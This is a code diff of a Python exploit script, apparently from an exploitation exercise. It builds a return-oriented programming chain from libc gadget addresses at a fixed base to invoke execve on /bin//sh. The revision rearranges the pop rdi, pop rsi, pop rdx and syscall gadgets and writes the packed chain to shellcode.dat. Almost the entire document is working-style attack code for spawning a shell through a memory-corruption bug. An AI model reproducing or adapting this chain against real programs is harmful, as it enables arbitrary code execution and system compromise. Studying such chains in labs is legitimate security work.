@@ -8,15 +8,17 @@ import binascii
 LIBC_OFFSET = 0x7ffff7a3a000
 g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
-g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #=0x7FFFF7BE5793  pop rdx + rsi
+g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #  pop rdx
 d2 = 0
 d3 = 0
-
-g3 = LIBC_OFFSET + 0xb8993 + 0xe #=0x7FFFF7AF29A1   movabs $7526411283028599343, rcx
-d4 = 0x68732f2f6e69622f #integer out of range for 'q' format code
+g3 = LIBC_OFFSET + 0x7a799 + 0xc # rsi +r15
+d4 = 0
 d5 = 0
-g4 = LIBC_OFFSET + 0x18f503 + 0xf
-g5 = LIBC_OFFSET + 0x132bae + 0xe
+g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
+d6 = 0x68732f2f6e69622f #/bin//sh
+d7 = 0
+g5 = LIBC_OFFSET + 0x18f503 + 0xf #push rsp
+g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall
 
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
 
@@ -31,7 +33,10 @@ shellcode += struct.pack('<q', g3)
 shellcode += struct.pack('<q', d4)
 shellcode += struct.pack('<q', d5)
 shellcode += struct.pack('<q', g4)
+shellcode += struct.pack('<q', d6)
+shellcode += struct.pack('<q', d7)
 shellcode += struct.pack('<q', g5)
+shellcode += struct.pack('<q', g6)
 
 print ("shellcode: "+ shellcode)
 with open("shellcode.dat", "wb") as f:
